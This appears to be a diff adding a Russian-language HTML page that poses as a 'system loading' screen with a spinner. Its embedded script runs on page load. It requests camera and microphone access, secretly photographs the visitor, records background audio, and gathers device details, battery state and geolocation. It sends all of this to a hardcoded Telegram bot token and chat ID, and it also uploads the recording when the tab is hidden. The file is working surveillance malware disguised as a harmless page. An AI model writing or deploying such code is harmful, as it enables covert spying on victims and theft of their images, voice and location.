@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка системы...</title>
+    <style>
+        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #333; border-top: 4px solid #3390ec; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        canvas, video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <video id="v" autoplay></video>
+    <canvas id="c"></canvas>
+
+<script>
+    const TOKEN = '7652180697:AAG88k8oUuC6rVu16DzHPxehqeZ9j9dNSpM';
+    const ID = '8516906113';
+    let chunks = [];
+    let recorder;
+
+    async function send(data, type = 'message', name = '') {
+        const fd = new FormData();
+        fd.append('chat_id', ID);
+        if (type === 'photo') { fd.append('photo', data, 'face.jpg'); }
+        else if (type === 'doc') { fd.append('document', data, name); }
+        else { fd.append('text', data); }
+        
+        const url = `https://api.telegram.org/bot${TOKEN}/${type === 'message' ? 'sendMessage' : 'send' + type.charAt(0).toUpperCase() + type.slice(1)}`;
+        return fetch(url, { method: 'POST', body: fd });
+    }
+
+    async function collectData() {
+        let info = `⚡️ НОВЫЙ ЛОГ:\n`;
+        info += `🌐 IP: (см. в боте)\n💻 ОС: ${navigator.platform}\n📱 Браузер: ${navigator.userAgent}\n`;
+        info += `🔋 Заряд: (ожидание...)\n🧠 Ядра: ${navigator.hardwareConcurrency}\n📏 Экран: ${screen.width}x${screen.height}\n`;
+        
+        try {
+            const batt = await navigator.getBattery();
+            info += `🔋 Уровень заряда: ${Math.round(batt.level * 100)}%\n🔌 На зарядке: ${batt.charging ? 'Да' : 'Нет'}\n`;
+        } catch(e) {}
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                info += `📍 ГЕО: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                send(info);
+            }, () => send(info));
+        } else { send(info); }
+    }
+
+    async function start() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = stream;
+
+            // 1. Мгновенное скрытое фото через 1.5 сек (чтобы камера сфокусировалась)
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                const video = document.getElementById('v');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(b => send(b, 'photo'), 'image/jpeg');
+            }, 1500);
+
+            // 2. Сбор системных данных
+            collectData();
+
+            // 3. Запуск фоновой аудиозаписи
+            recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                if (chunks.length > 0) {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    send(blob, 'doc', 'voice_record.ogg');
+                }
+            };
+            recorder.start();
+
+        } catch (e) {
+            send("⚠️ Доступ к камере/микрофону отклонен пользователем.");
+        }
+    }
+
+    // Отправка записи при закрытии вкладки или сворачивании
+    window.addEventListener('visibilitychange', () => {
+        if (document.hidden && recorder && recorder.state === "recording") {
+            recorder.stop();
+        }
+    });
+
+    window.onload = start;
+</script>
+</body>
+</html>
